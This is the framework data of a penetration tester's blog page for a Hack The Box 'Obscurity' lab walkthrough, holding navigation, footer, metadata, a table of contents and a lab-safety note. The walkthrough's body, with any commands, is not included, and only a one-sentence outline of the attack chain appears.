-7:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-object-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Object Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T12:30:13.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-oouch-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Oouch Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T12:26:26.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-8:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$Ld",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-e:T59a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/#article","headline":"Hack The Box: Obscurity Walkthrough","description":"A leaked custom web-server source file exposed Python exec injection for a www-data shell, a known-plaintext attack recovered Robert's password, and argument injection in his sudoed BetterSSH script selected root as the execution user.","url":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/","datePublished":"2026-06-11T12:28:32.000Z","dateModified":"2026-06-11T12:28:32.000Z","wordCount":3263,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6c5a33d5515bef07ca9ed3c33aefb71993b86d63/HTB-Obscurity.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-obscurity-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Obscurity Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/"}]}]}9:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
-a:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
-11:null
+<hr>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"background","label":"Background"},{"id":"step-1-initial-reconnaissance-nmap","label":"Step 1: Initial Reconnaissance (Nmap)"},{"id":"step-2-web-enumeration","label":"Step 2: Web Enumeration"},{"id":"step-3-discovering-the-secret-directory","label":"Step 3: Discovering the Secret Directory"},{"id":"step-4-source-code-analysis","label":"Step 4: Source Code Analysis"},{"id":"step-5-exploiting-python-exec-injection","label":"Step 5: Exploiting Python exec() Injection"},{"id":"step-6-stabilizing-the-shell","label":"Step 6: Stabilizing the Shell"},{"id":"step-7-post-exploitation-enumeration","label":"Step 7: Post-Exploitation Enumeration"},{"id":"step-8-cryptographic-analysis-known-plaintext-attack","label":"Step 8: Cryptographic Analysis (Known-Plaintext Attack)"},{"id":"step-9-privilege-escalation-to-robert","label":"Step 9: Privilege Escalation to robert"},{"id":"step-10-root-privilege-escalation","label":"Step 10: Root Privilege Escalation"},{"id":"alternative-root-paths","label":"Alternative Root Paths"},{"id":"lessons-learned","label":"Lessons Learned"},{"id":"complete-command-reference","label":"Complete Command Reference"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6c5a33d5515bef07ca9ed3c33aefb71993b86d63/HTB-Obscurity.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 6c5a33d5515b",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Obscurity, Linux, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/obscurity","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"3 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-object-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Object Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T12:30:13.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-oouch-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Oouch Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T12:26:26.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T59a,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/#article","headline":"Hack The Box: Obscurity Walkthrough","description":"A leaked custom web-server source file exposed Python exec injection for a www-data shell, a known-plaintext attack recovered Robert's password, and argument injection in his sudoed BetterSSH script selected root as the execution user.","url":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/","datePublished":"2026-06-11T12:28:32.000Z","dateModified":"2026-06-11T12:28:32.000Z","wordCount":3263,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/6c5a33d5515bef07ca9ed3c33aefb71993b86d63/HTB-Obscurity.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-obscurity-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Obscurity Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-obscurity-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
